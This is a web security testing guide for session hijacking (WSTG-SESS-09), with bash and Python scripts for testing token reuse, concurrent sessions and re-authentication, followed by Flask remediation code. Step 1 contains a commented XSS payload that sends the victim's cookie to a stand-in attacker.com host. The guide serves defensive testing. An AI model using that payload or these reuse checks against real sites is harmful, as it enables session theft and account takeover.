# WSTG-SESS-09: Testing for Session Hijacking

## Test ID
WSTG-SESS-09

## Test Name
Testing for Session Hijacking

## High-Level Description

Session hijacking occurs when an attacker obtains a valid session token through various means (sniffing, XSS, prediction) and uses it to impersonate the legitimate user. This test evaluates the application's resilience against session hijacking attacks and the effectiveness of protective measures.

---

## What to Check

- [ ] Token transmission security (HTTPS)
- [ ] Token exposure vectors (XSS, logs)
- [ ] Session binding (IP, User-Agent)
- [ ] Concurrent session detection
- [ ] Session token predictability
- [ ] Re-authentication for sensitive operations

---

## How to Test

### Step 1: Test Session Token Theft via XSS

```bash
# If XSS exists, test cookie accessibility
# Inject and observe if session cookie is captured

# XSS payload for cookie theft
# <script>document.location='https://attacker.com/?c='+document.cookie</script>

# Check HttpOnly flag
curl -sI "https://target.com" | grep -i "set-cookie" | grep -i "httponly"
```

### Step 2: Test Session Token Reuse

```bash
#!/bin/bash
TARGET="https://target.com"

# Capture valid session from User A
session_a=$(curl -s -c - -X POST "$TARGET/login" \
    -d "username=usera&password=passa" | grep -oP "SESSIONID=\K[^;]+")

# Use session from different network/machine
# Simulate different User-Agent
response=$(curl -s -b "SESSIONID=$session_a" \
    -H "User-Agent: Different-Browser/1.0" \
    "$TARGET/dashboard")

if echo "$response" | grep -q "Welcome"; then
    echo "[WARN] Session accepted from different User-Agent"
fi
```

### Step 3: Session Hijacking Tester

```python
#!/usr/bin/env python3
import requests

class SessionHijackingTester:
    def __init__(self, base_url):
        self.base_url = base_url
        self.findings = []

    def test_session_reuse_different_context(self, login_creds):
        """Test if session works from different context"""
        print("[*] Testing session reuse from different context...")

        # Get legitimate session
        session1 = requests.Session()
        session1.post(f"{self.base_url}/login", data=login_creds)

        session_cookie = None
        for cookie in session1.cookies:
            if 'session' in cookie.name.lower():
                session_cookie = cookie.value
                break

        if not session_cookie:
            print("[!] No session cookie found")
            return

        # Use session from "different" context
        session2 = requests.Session()
        session2.headers['User-Agent'] = 'DifferentBrowser/1.0'
        session2.cookies.set('SESSIONID', session_cookie)

        response = session2.get(f"{self.base_url}/dashboard")

        if response.status_code == 200 and 'login' not in response.url.lower():
            print("[WARN] Session accepted from different User-Agent")
            print("       Consider implementing session binding")
        else:
            print("[OK] Session binding in place")

    def test_concurrent_sessions(self, login_creds):
        """Test concurrent session handling"""
        print("\n[*] Testing concurrent sessions...")

        # Login from two sessions
        session1 = requests.Session()
        session2 = requests.Session()

        session1.post(f"{self.base_url}/login", data=login_creds)
        session2.post(f"{self.base_url}/login", data=login_creds)

        # Check if both sessions work
        r1 = session1.get(f"{self.base_url}/dashboard")
        r2 = session2.get(f"{self.base_url}/dashboard")

        both_work = (r1.status_code == 200 and r2.status_code == 200)

        if both_work:
            print("[INFO] Multiple concurrent sessions allowed")
        else:
            print("[OK] Previous session invalidated on new login")

    def test_reauthentication(self, login_creds, sensitive_action):
        """Test if sensitive operations require re-authentication"""
        print("\n[*] Testing re-authentication for sensitive operations...")

        session = requests.Session()
        session.post(f"{self.base_url}/login", data=login_creds)

        # Try sensitive action without re-auth
        response = session.post(f"{self.base_url}{sensitive_action}")

        if response.status_code == 200:
            print("[WARN] Sensitive action allowed without re-authentication")
            self.findings.append({
                "issue": "No re-auth for sensitive operations",
                "severity": "Medium"
            })

# Usage
tester = SessionHijackingTester("https://target.com")
tester.test_session_reuse_different_context({"username": "test", "password": "test"})
tester.test_concurrent_sessions({"username": "test", "password": "test"})
tester.test_reauthentication({"username": "test", "password": "test"}, "/api/change-password")
```

---

## Remediation Guide

### Session Binding

```python
import hashlib
from flask import session, request, abort

@app.before_request
def validate_session_binding():
    if 'user_id' not in session:
        return

    # Check User-Agent binding
    current_ua = hashlib.sha256(
        request.headers.get('User-Agent', '').encode()
    ).hexdigest()

    if session.get('user_agent_hash') != current_ua:
        session.clear()
        abort(401)

@app.route('/login', methods=['POST'])
def login():
    if authenticate(request.form):
        session['user_id'] = user.id
        session['user_agent_hash'] = hashlib.sha256(
            request.headers.get('User-Agent', '').encode()
        ).hexdigest()
        return redirect('/dashboard')
```

### Re-authentication for Sensitive Operations

```python
@app.route('/change-password', methods=['POST'])
@require_auth
@require_reauth  # Custom decorator that checks for recent password entry
def change_password():
    # Process password change
    pass
```

---

## Risk Assessment

| Finding | CVSS | Severity |
|---------|------|----------|
| No session binding | 5.3 | Medium |
| No re-auth for sensitive ops | 5.3 | Medium |
| Session accessible via XSS | 7.5 | High |

---

## CWE Categories

| CWE ID | Title |
|--------|-------|
| **CWE-384** | Session Fixation |
| **CWE-287** | Improper Authentication |

---

## Checklist

```
[ ] Token theft vectors tested
[ ] Session reuse tested
[ ] Session binding evaluated
[ ] Concurrent sessions tested
[ ] Re-authentication tested
[ ] Findings documented
```
